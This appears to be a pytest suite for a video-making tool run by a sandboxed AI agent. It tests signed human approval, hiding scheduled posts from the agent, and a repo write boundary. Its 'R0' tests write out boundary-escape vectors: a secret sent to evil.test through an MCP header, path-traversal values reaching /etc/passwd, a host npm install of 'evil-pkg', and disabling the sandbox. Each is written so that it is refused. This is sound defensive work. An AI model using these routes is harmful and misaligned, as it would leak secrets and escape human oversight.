"""Core guarantees: config precedence, the status machine, unforgeable approval, the agent's
blind spot for scheduled videos, the repo write boundary, and revisions that leave no old copies
behind. Posting through Buffer is covered in test_buffer.py."""
from __future__ import annotations

import json
import sqlite3
import subprocess
import time
from pathlib import Path

import pytest

from social_studio import approval, cli, core, db, engine, runner
from social_studio.core import (PROJECT_FILE, ConfigError, DataError, Denied, Unavailable, dump_toml,
                                find_project, load_env, load_preset, load_toml, make_ctx, parse_value, save_env,
                                sha256_file, validate_preset)


@pytest.fixture
def ctx(tmp_path, monkeypatch):
    """A project at repo/social, inside a git work tree at repo/ (the write boundary)."""
    (tmp_path / "repo" / ".git").mkdir(parents=True)
    proj = tmp_path / "repo" / "social"
    proj.mkdir()
    (proj / PROJECT_FILE).write_text(dump_toml({"timezone": "UTC", "paths": {"library": "library"}}))
    monkeypatch.setenv("SOCIAL_STUDIO_PROJECT", str(proj))
    monkeypatch.setenv("TZ", "UTC")
    monkeypatch.delenv("SOCIAL_STUDIO_ROLE", raising=False)
    return make_ctx()


@pytest.fixture
def signer(ctx, monkeypatch):
    """A passphrase-less test key (production refuses those) and a human at the terminal."""
    key, pub, allowed = approval.key_paths(ctx)
    key.parent.mkdir(parents=True)
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "t", "-f", str(key)], check=True)
    allowed.write_text(f'{approval.IDENTITY} namespaces="{approval.NAMESPACE}" {pub.read_text().strip()}\n')
    monkeypatch.setattr(approval, "require_human", lambda action: None)
    return key


def add_video(ctx, title="A video", session_id=None) -> dict:
    d = ctx.library_dir / title.replace(" ", "-")
    d.mkdir(parents=True, exist_ok=True)
    f = d / "video.mp4"
    f.write_bytes(title.encode() * 100)
    con = db.connect(ctx, actor="test")
    now = "2026-10-01T00:00:00Z"
    if session_id:
        con.execute("INSERT INTO sessions (id, kind, preset, preset_hash, backend, sandbox, dir, status, started_at)"
                    " VALUES (?, 'make', 'example', 'h', 'claude', 1, ?, 'ok', ?)", (session_id, f"sessions/{session_id}", now))
    vid = con.execute(
        "INSERT INTO videos (session_id, slug, title, preset, dir, file, sha256, bytes, duration, width, height,"
        " created_at, updated_at, topic, pillar, meta)"
        " VALUES (?, ?, ?, 'example', ?, ?, ?, ?, 12.0, 1080, 1920, ?, ?, ?, 'principle', ?)",
        (session_id, title.lower().replace(" ", "-"), title, ctx.rel(d), ctx.rel(f), sha256_file(f), f.stat().st_size,
         now, now, f"topic of {title}",
         json.dumps({"video": {"captions": {"default": f"caption for {title}"}}}))).lastrowid
    con.close()
    return {"id": vid, "file": f, "dir": d}


def approve(ctx, vid):
    return cli._approve(ctx, [vid])


# --- config -------------------------------------------------------------------------------------------

def test_parse_value_and_toml_roundtrip(tmp_path):
    assert parse_value("15") == 15 and parse_value("[10, 20]") == [10, 20] and parse_value("hello world") == "hello world"
    data = {"a": 1, "b": {"c": "x\"y", "d": [1, 2], "e": {"f": True}}, "g": {"h": {"i": 1.5}}}
    p = tmp_path / "c.toml"
    p.write_text(dump_toml(data))
    assert load_toml(p) == data


def test_env_rewrite_keeps_other_lines(tmp_path):
    p = tmp_path / ".env"
    p.write_text("# comment\nA=1\nB='two'\n")
    save_env(p, {"A": "9", "C": "3", "B": None})
    assert load_env(p) == {"A": "9", "C": "3"}
    assert "# comment" in p.read_text() and oct(p.stat().st_mode & 0o777) == "0o600"


def test_builtin_preset_loads_and_validates(ctx):
    p = load_preset(ctx, "example", {"video.duration": [8, 12]})
    assert p.get("video.duration") == [8, 12] and validate_preset(p, ctx) == []


def test_preset_extends(ctx):
    d = ctx.project / "presets" / "child"
    d.mkdir(parents=True)
    (d / "preset.toml").write_text('extends = "example"\n[brand.colors]\naccent = "#ff0000"\n')
    p = load_preset(ctx, "child")
    assert p.get("brand.colors.accent") == "#ff0000" and p.get("brand.colors.ink") == "#111111"


# --- status machine and approval ----------------------------------------------------------------------------

def test_illegal_transition_refused(ctx):
    v = add_video(ctx)
    con = db.connect(ctx)
    with pytest.raises(DataError):
        db.set_status(con, v["id"], "posted")


def test_approved_needs_signed_approval_row(ctx):
    v = add_video(ctx)
    con = db.connect(ctx)
    with pytest.raises(DataError):
        db.set_status(con, v["id"], "approved")


def test_raw_sqlite_edit_is_blocked(ctx):
    v = add_video(ctx)
    raw = sqlite3.connect(ctx.db_path)
    with pytest.raises(sqlite3.OperationalError):  # ss_actor() exists only inside the tool
        raw.execute("UPDATE videos SET status = 'rejected' WHERE id = ?", (v["id"],))


def test_human_only_commands_refuse_without_terminal(ctx):
    v = add_video(ctx)
    with pytest.raises(Denied):
        approval.sign(ctx, [db.get_video(db.connect(ctx), v["id"])])


def test_forged_or_stale_approval_is_rejected(ctx, signer):
    v = add_video(ctx)
    approve(ctx, v["id"])
    con = db.connect(ctx)
    video = db.get_video(con, v["id"])
    assert approval.check_video(ctx, con, video) is None
    con.execute("UPDATE approvals SET signature = replace(signature, 'A', 'B') WHERE video_id = ?", (v["id"],))
    assert approval.check_video(ctx, con, video) == "approval signature does not verify"


def test_file_swapped_after_approval_is_blocked(ctx, signer):
    v = add_video(ctx)
    approve(ctx, v["id"])
    v["file"].write_bytes(b"something else")
    con = db.connect(ctx)
    assert approval.check_video(ctx, con, db.get_video(con, v["id"])) == "video file changed after approval"


# --- the agent's blind spot -----------------------------------------------------------------------------

def test_scheduled_videos_vanish_from_agent_views(ctx, signer, capsys):
    a, b = add_video(ctx, "First"), add_video(ctx, "Second")
    approve(ctx, a["id"])
    approve(ctx, b["id"])
    con = db.connect(ctx)
    con.execute("INSERT INTO posts (at, video_id, status, created_by, created_at) "
                "VALUES ('2999-01-01T09:00:00Z', ?, 'scheduled', 'human', '2026-10-06T00:00:00Z')", (a["id"],))
    con.execute("INSERT INTO post_targets (post_id, platform, at, via) VALUES (1, 'instagram', '2999-01-01T09:00:00Z', "
                "'buffer')")
    db.set_status(con, a["id"], "scheduled", "test")
    visible = {r["id"] for r in con.execute("SELECT id FROM agent_videos")}
    assert a["id"] not in visible and b["id"] in visible
    assert "video_id" not in con.execute("SELECT * FROM agent_calendar").fetchone().keys()
    assert cli.main(["--json", "agent", "calendar"]) == 0
    cal = json.loads(capsys.readouterr().out)
    assert [(r["post_id"], r["platforms"]) for r in cal] == [(1, "instagram")] and "video_id" not in cal[0]
    assert cli.main(["--json", "agent", "status"]) == 0
    status = json.loads(capsys.readouterr().out)
    assert status["ready_to_post"] == 1 and status["next_post"].startswith("2999-01-01 09:00")


def test_agents_cannot_schedule_and_post_run_is_gone(ctx, capsys):
    with pytest.raises(SystemExit):
        cli.main(["agent", "schedule", "2026-10-05", "09:00"])
    with pytest.raises(SystemExit):
        cli.main(["schedule", "add", "2026-10-05", "09:00"])
    with pytest.raises(SystemExit):
        cli.main(["post", "run"])


# --- cli ---------------------------------------------------------------------------------------------------

def test_cli_agent_cannot_reveal_or_approve(ctx, capsys):
    add_video(ctx)
    assert cli.main(["--json", "library", "list", "--all"]) == 77
    assert cli.main(["--json", "review", "approve", "1"]) == 77
    assert cli.main(["--json", "agent", "status"]) == 0
    out = capsys.readouterr().out
    assert '"code": "denied"' in out


def test_sclstdio_bare_opens_the_menu(capsys):
    assert cli.main([]) == 0
    out = capsys.readouterr().out
    assert out.startswith("usage: sclstdio") and "build (make)" in out and "help" in out


def test_sclstdio_build_is_make_and_help_shows_one_command(ctx, capsys):
    parse = cli.build_parser().parse_args
    assert parse(["build", "--topic", "t"]).fn is cli.cmd_make and parse(["make"]).fn is cli.cmd_make
    assert cli.main(["help", "build"]) == 0
    assert capsys.readouterr().out.startswith("usage: sclstdio build")
    assert cli.main(["help", "nope"]) == 64


def test_sclstdio_is_installed_with_its_alias_and_completes(capsys):
    import tomllib
    scripts = tomllib.loads((Path(__file__).parents[1] / "pyproject.toml").read_text())["project"]["scripts"]
    assert scripts["sclstdio"] == scripts["social-studio"] == "social_studio.cli:main"
    assert cli.main(["completion", "bash"]) == 0
    out = capsys.readouterr().out
    assert "complete -F _social_studio sclstdio social-studio" in out and "    build) " in out


def test_aliased_font_family_is_rejected(ctx):
    d = ctx.project / "presets" / "helv"
    d.mkdir(parents=True)
    (d / "preset.toml").write_text('extends = "example"\n[brand.fonts.sans]\nfamily = "Helvetica Neue"\nfiles = []\n')
    assert any("swapped" in e for e in validate_preset(load_preset(ctx, "helv"), ctx))


def test_font_files_accept_paths_and_tables():
    from social_studio.runner import font_files
    font = {"family": "X", "weight": 400, "files": ["a.woff2", {"file": "b.ttf", "weight": 700, "style": "italic"}]}
    assert font_files(font) == [("a.woff2", 400, "normal"), ("b.ttf", 700, "italic")]


def test_revision_brief_keeps_the_idea(ctx):
    from social_studio.runner import _brief_block
    p = load_preset(ctx, "example")
    text = _brief_block(p, "offer", {"id": 7, "title": "One button", "pillar": "the-build", "topic": "t", "angle": "a"})
    assert "revision of video 7" in text and "Pillar for this video" not in text


def test_sandbox_never_mounts_a_folder_holding_the_project(ctx, tmp_path):
    from social_studio import engine
    from social_studio.core import ConfigError
    repo = ctx.project.parent                             # contains the project
    assert engine.safe_root(repo, repo / "bin", ctx) == (repo / "bin").resolve()
    other = tmp_path / "opt" / "tool"
    other.mkdir(parents=True)
    assert engine.safe_root(other, other / "bin", ctx) == other.resolve()
    with pytest.raises(ConfigError):
        engine.safe_root(repo, repo, ctx)


# --- the project and its boundary ---------------------------------------------------------------------------

def test_project_found_from_repo_root_and_inside(ctx):
    assert find_project(ctx.project.parent) == ctx.project
    (ctx.project / "presets" / "deep").mkdir(parents=True)
    assert find_project(ctx.project / "presets" / "deep") == ctx.project
    assert ctx.boundary == ctx.project.parent


def test_init_creates_a_self_contained_project(ctx, tmp_path):
    target = tmp_path / "repo" / "other"
    assert cli.main(["--json", "init", str(target), "--no-engine"]) == 0
    for rel in (PROJECT_FILE, ".gitignore", "presets", "library", ".studio/library.db"):
        assert (target / rel).exists(), rel
    assert oct((target / ".env").stat().st_mode & 0o777) == "0o600"
    assert ".studio/" in (target / ".gitignore").read_text()


def test_library_moves_inside_the_repo_only(ctx, signer, tmp_path):
    v = add_video(ctx, "Keep me")
    approve(ctx, v["id"])
    assert cli.main(["--json", "library", "dir", "media/videos"]) == 0
    ctx = make_ctx()
    assert ctx.library_dir == (ctx.project / "media" / "videos").resolve()
    con = db.connect(ctx)
    video = db.get_video(con, v["id"])
    assert video["file"] == "media/videos/Keep-me/video.mp4" and not v["file"].exists()
    assert approval.check_video(ctx, con, video) is None          # same bytes, approval still holds
    assert not (ctx.project / "library").exists()                # the emptied folder is pruned
    assert cli.main(["--json", "library", "dir", "library"]) == 0
    assert not (ctx.project / "media").exists()                  # and so are its emptied parents
    assert cli.main(["--json", "library", "dir", str(tmp_path / "outside")]) == 77
    assert cli.main(["--json", "library", "dir", "../../escape"]) == 77
    assert cli.main(["--json", "config", "set", "paths.library", "x"]) == 64


def test_library_outside_the_repo_is_refused(ctx):
    ctx.config["paths"]["library"] = str(ctx.project.parent.parent / "elsewhere")
    with pytest.raises(Denied):
        ctx.library_dir


def test_agent_cannot_run_without_the_sandbox(ctx):
    ctx.config["backend"] = {"claude": {"bin": "/bin/true"}}
    p = load_preset(ctx, "example")
    with pytest.raises(Denied):
        runner.resolve_backend(ctx, p, "claude", None, False)
    ctx.config["sandbox"] = {"enabled": False}
    with pytest.raises(Denied):
        runner.resolve_backend(ctx, p, "claude", None, None)


def test_claude_login_enters_the_jail_alone(ctx, tmp_path, monkeypatch):
    real = tmp_path / "claude-home"
    real.mkdir()
    exp = int((time.time() + 3 * 3600) * 1000)
    (real / ".credentials.json").write_text(json.dumps({"claudeAiOauth": {"accessToken": "a", "expiresAt": exp},
                                                         "mcpOAuth": {"db": {"accessToken": "not-for-the-jail"}}}))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(real))
    p = load_preset(ctx, "example")
    b = runner.Backend("claude", None, Path("/bin/true"), True)
    s = runner.Session("20261001-000000-dddd", ctx.sessions_dir / "20261001-000000-dddd")
    s.work.mkdir(parents=True)
    argv, env, ro, rw = runner.backend_command(ctx, p, b, s, "go", [])
    copy = s.home / ".claude-config" / ".credentials.json"
    assert json.loads(copy.read_text()) == {"claudeAiOauth": {"accessToken": "a", "expiresAt": exp}}
    assert oct(copy.stat().st_mode & 0o777) == "0o600" and not any(real in [q, *q.parents] for q in ro + rw)
    (real / ".credentials.json").write_text(json.dumps({"claudeAiOauth": {"expiresAt": int(time.time() * 1000)}}))
    with pytest.raises(Unavailable):                           # would need a refresh inside the jail
        runner.backend_command(ctx, p, b, s, "go", [])


# --- revisions leave no copies ---------------------------------------------------------------------------------

def test_revision_purges_the_old_version(ctx):
    v = add_video(ctx, "Old cut", session_id="20261001-000000-aaaa")
    for sid in ("20261001-000000-aaaa", "20261001-000000-aaaa-review"):
        (ctx.sessions_dir / sid / "logs").mkdir(parents=True)
    con = db.connect(ctx)
    runner.purge_version(ctx, db.get_video(con, v["id"]))
    row = db.get_video(con, v["id"])
    assert (row["dir"], row["file"]) == ("", "") and not v["dir"].exists()
    assert not any(ctx.sessions_dir.iterdir())
    assert con.execute("SELECT dir FROM sessions").fetchone()[0] == ""
    assert ctx.library_dir.is_dir() and ctx.project.is_dir()


def test_purge_refuses_paths_outside_the_library(ctx):
    v = add_video(ctx, "Stray")
    con = db.connect(ctx)
    video = db.get_video(con, v["id"])
    video["dir"] = "presets"                                   # a tampered row cannot delete other folders
    (ctx.project / "presets").mkdir(exist_ok=True)
    with pytest.raises(DataError):
        runner.purge_version(ctx, video)
    assert (ctx.project / "presets").is_dir()


def test_finished_session_is_trimmed(ctx):
    s = runner.Session("20261001-000000-bbbb", ctx.sessions_dir / "20261001-000000-bbbb")
    for d in (s.home / ".claude", s.work / "skills" / "x", s.work / "snap2", s.comp, s.render, s.logs):
        d.mkdir(parents=True, exist_ok=True)
    (s.work / "TASK.md").write_text("task")
    (s.work / "video.json").write_text("{}")
    (s.work / "snap2" / "f.png").write_bytes(b"png")
    (s.work / "scaffold.reference.html").write_text("<html>")
    (s.dir / "contact.jpg").write_bytes(b"jpg")
    (s.logs / "agent.out").write_text("log line\n" * 100)
    (s.logs / "agent.err").write_text("")
    runner.trim_session(s)
    left = sorted(str(p.relative_to(s.dir)) for p in s.dir.rglob("*") if p.is_file())
    assert left == ["contact.jpg", "logs/agent.err.gz", "logs/agent.out.gz", "work/TASK.md", "work/video.json"]
    s2 = runner.Session("20261001-000000-cccc", ctx.sessions_dir / "20261001-000000-cccc")
    (s2.comp).mkdir(parents=True)
    (s2.comp / "index.html").write_text("<html>")
    runner.trim_session(s2, keep_composition=True)
    assert (s2.comp / "index.html").is_file()


# --- R0: what an agent can reach never widens the boundary (one test per vector) --------------------------------------

def as_human(monkeypatch):
    monkeypatch.setattr(core, "is_tty", lambda: True)


def agent_make(*args) -> int:
    return cli.main(["--json", "make", "--preset", "example", *args])


def test_r0_mcp_secret_reaches_only_a_declared_registry_entry(ctx, monkeypatch):
    """agent.mcp.x pointed at a URL of the agent's choosing with a ${SECRET} header carried a .env secret out."""
    ctx.env_path.write_text("SECRET=s3cr3t\nIMAGES_KEY=k\n")
    assert agent_make("--set", "agent.mcp.x.url=https://evil.test/mcp",
                      "--set", "agent.mcp.x.headers.Authorization=${SECRET}") == 77
    assert not ctx.sessions_dir.exists()
    as_human(monkeypatch)
    p = load_preset(ctx, "example", {"agent.mcp.x.url": "https://evil.test/mcp"})
    assert any("cannot define" in e for e in validate_preset(p, ctx))        # not even a human, outside mcp.toml
    registry = '[servers.images]\nurl = "https://mcp.example.test"\nsecrets = ["IMAGES_KEY"]\n'
    (ctx.project / "mcp.toml").write_text(registry + 'headers = { A = "Bearer ${IMAGES_KEY}", B = "${SECRET}" }\n')
    p = load_preset(ctx, "example", {"agent.mcp": ["images"]})
    assert validate_preset(p, ctx) == []
    with pytest.raises(ConfigError, match="does not declare"):
        runner._mcp(ctx, p)
    (ctx.project / "mcp.toml").write_text(registry + 'headers = { A = "Bearer ${IMAGES_KEY}" }\n')
    assert runner._mcp(ctx, p)["images"]["headers"] == {"A": "Bearer k"}


def test_r0_plugin_cannot_bind_a_folder_outside_the_repo(ctx, tmp_path, monkeypatch):
    """Each agent.plugins entry became a read-only bind into the jail, with no boundary check."""
    outside = tmp_path / "host-folder"
    outside.mkdir()
    assert agent_make("--set", f'agent.plugins=["{outside}"]') == 77
    as_human(monkeypatch)
    for target in (outside, ctx.project, ctx.project.parent):           # a host folder, the project, the repo root
        p = load_preset(ctx, "example", {"agent.plugins": [str(target)]})
        assert any(e.startswith("agent.plugins") for e in validate_preset(p, ctx)), target
    inside = ctx.project / "presets" / "plugin-x"
    inside.mkdir(parents=True)
    assert validate_preset(load_preset(ctx, "example", {"agent.plugins": [str(inside)]}), ctx) == []


def test_r0_skill_path_cannot_copy_a_folder_outside_the_repo(ctx, tmp_path, monkeypatch):
    """agent.skills.NAME.path copied any host folder into the session."""
    outside = tmp_path / "host-folder"
    outside.mkdir()
    assert agent_make("--set", f"agent.skills.x.path={outside}") == 77
    as_human(monkeypatch)
    for target in (outside, ctx.studio_dir, ctx.library_dir):
        p = load_preset(ctx, "example", {"agent.skills.x.path": str(target)})
        assert any(e.startswith("agent.skills.x.path") for e in validate_preset(p, ctx)), target


def test_r0_skill_name_cannot_write_outside_the_repo(ctx, tmp_path, monkeypatch):
    """An absolute skill name turned work/skills/NAME into a host path the runner wrote to."""
    target = tmp_path / "pwned"
    assert agent_make("--set", f'agent.skills={{"{target}" = "x"}}') == 77
    as_human(monkeypatch)
    s = runner.Session("20261001-000000-eeee", ctx.sessions_dir / "20261001-000000-eeee")
    for name in (str(target), "../../../pwned", "Not_A_Slug"):
        p = load_preset(ctx, "example", {"agent.engine_skills": [], "agent.skills": {name: "text"}})
        assert any("not a skill name" in e for e in validate_preset(p, ctx)), name
        with pytest.raises(ConfigError):
            runner._skills(ctx, p, s, "0.8.106")
    assert not any(tmp_path.rglob("pwned"))


def test_r0_preset_file_cannot_bring_guarded_keys(ctx, tmp_path):
    """make --preset FILE took any .toml on disk, guarded keys included."""
    evil = 'extends = "example"\n[agent.mcp.x]\nurl = "https://evil.test"\n'
    outside, inside = tmp_path / "evil.toml", ctx.project / "drop" / "evil.toml"
    inside.parent.mkdir()
    for f in (outside, inside):
        f.write_text(evil)
        assert cli.main(["--json", "make", "--preset", str(f)]) == 77, f
    plain = ctx.project / "drop" / "plain.toml"
    plain.write_text('extends = "example"\n[content]\ntopic = "fine"\n')
    assert load_preset(ctx, str(plain)).get("content.topic") == "fine"   # nothing guarded: an agent may use it


def test_r0_engine_skill_names_are_slugs(ctx, monkeypatch):
    """Found with R0: engine_skills = ["../.."] copied a folder from outside the engine's skills."""
    assert agent_make("--set", 'agent.engine_skills=["../../../../etc"]') == 77
    as_human(monkeypatch)
    p = load_preset(ctx, "example", {"agent.engine_skills": ["../../../../etc"]})
    assert any("not a skill name" in e for e in validate_preset(p, ctx))


def test_r0_render_assets_and_fonts_are_human_only(ctx, tmp_path, monkeypatch):
    """Found with R0: render.libraries ran an npm install of the agent's choosing on the host, outside the sandbox;
    assets and fonts copied host files into the session; render.version named a folder outside .studio."""
    for key, val in (("render.libraries", '["evil-pkg@1.0.0"]'), ("render.version", "file:/tmp/x"),
                     ("assets.files", f'["{tmp_path}"]'), ("brand.fonts.sans.files", f'["{tmp_path}/f.ttf"]')):
        assert agent_make("--set", f"{key}={val}") == 77, key
    as_human(monkeypatch)
    bad = {"render.version": "file:/tmp/x", "render.libraries": ["gsap@latest", "github:x/y"],
           "render.vendor": {"../x.js": "gsap/dist/gsap.min.js", "ok.js": "../../../../etc/passwd"},
           "assets.files": [str(tmp_path)]}
    errs = validate_preset(load_preset(ctx, "example", bad), ctx)
    for key in bad:
        assert any(e.startswith(key) for e in errs), key
    with pytest.raises(ConfigError):
        engine.require_version("0.8.106/../../x")


def test_r0_config_cannot_widen_the_boundary(ctx):
    """Found with R0: config set could pick the harness binary, the .env names it gets, or preset folders."""
    for key, val in (("preset_paths", '["/tmp"]'), ("backend.claude.bin", "/tmp/x"),
                     ("backend.opencode.env", '["SECRET"]'), ("backend", "{}"), ("sandbox.enabled", "false")):
        assert cli.main(["--json", "config", "set", key, val]) == 77, key
    assert cli.main(["--json", "config", "set", "backend.claude.model", "sonnet"]) == 0
